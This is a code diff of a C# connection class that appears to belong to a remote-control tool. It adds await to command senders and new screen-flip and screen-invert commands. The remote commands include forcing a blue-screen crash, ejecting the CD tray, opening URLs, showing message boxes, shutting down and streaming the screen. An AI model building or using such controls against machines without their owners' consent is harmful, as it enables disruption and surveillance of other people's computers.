@@ -84,43 +84,6 @@ public class Connection
             cancellationTokenSource = new CancellationTokenSource();
 
 
-
-            //SendData("info");
-
-            //byte[] buffer = new byte[1024];
-            //int bytesRead = await stream?.ReadAsync(buffer, 0, buffer.Length);
-            //string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-            //for (int i = 0; i < 100;)
-            //{
-            //    if (response.StartsWith("info"))
-            //    {
-            //        string info = response.Substring(4);
-
-            //        //try
-            //        //{
-            //        //    SystemInfoList list = JsonConvert.DeserializeObject<SystemInfoList>(info);
-            //        //    if (list != null)
-            //        //    {
-            //        //        SystemInfo systemInfo = new SystemInfo(list);
-            //        //        Window.SetTitle(list.Title);
-            //        //    }
-            //        //    else
-            //        //    {
-            //        //        Console.WriteLine("Failed to parse system info.");
-            //        //    }
-            //        //}
-            //        //catch (JsonException ex)
-            //        //{
-            //        //    Console.WriteLine("Error deserializing system info: " + ex.Message);
-            //        //}
-
-            //        Window.SetTitle(info);
-
-            //        break;
-            //    }
-            //    i++;
-            //}
-
             await Task.WhenAll(
                 Task.Run(() => ReceiveScreen(cancellationTokenSource.Token)),
                 Task.Factory.StartNew(async () => 
@@ -275,7 +238,7 @@ public class Connection
                     break;
                 }
 
-                
+
 
                 // Read the number of frames in the batch
                 byte[] frameCountBytes = new byte[sizeof(int)];
@@ -569,20 +532,20 @@ public class Connection
     {
         string url = await mainWindow.DialogCreateUrl(CancellationToken.None);
 
-        SendData("openweb" + url);
+        await SendData("openweb" + url);
 
     }
 
-    public void OpenCdTray()
+    public async void OpenCdTray()
     {
-        SendData("togglecd");
+        await SendData("togglecd");
     }
 
     public async void SendBSOD()
     {
         if(await mainWindow.DialogBSOD(CancellationToken.None))
         {
-            SendData("bsod");
+            await SendData("bsod");
 
         }
     }
@@ -591,7 +554,7 @@ public class Connection
     {
         string msg = await mainWindow.DialogCreateMsgBox(CancellationToken.None);
 
-        SendData("msg" + msg);
+         await SendData("msg" + msg);
 
     }
 
@@ -599,7 +562,7 @@ public class Connection
     {
         if(await mainWindow.DialogShutdown(CancellationToken.None))
         {
-            SendData("shutdown");
+            await SendData("shutdown");
         }
     }
 
@@ -607,20 +570,29 @@ public class Connection
     {
         if(await mainWindow.DialogRestart(CancellationToken.None))
         {
-            SendData("restart");
+            await SendData("restart");
         }
     }
 
-    public void Sleep()
+    public async void Sleep()
     {
-        SendData("sleep");
+        await SendData("sleep");
     }
 
-    public void LogOut()
+    public async void LogOut()
     {
-        SendData("logout");
+        await SendData("logout");
     }
 
+    public async void FlipScreen()
+    {
+        await SendData("flipScr");
+    }
+
+    public async void InvertScreen()
+    {
+        await SendData("invertScr");
+    }
 
 
     public async Task<SystemInfoList> SysInfo()
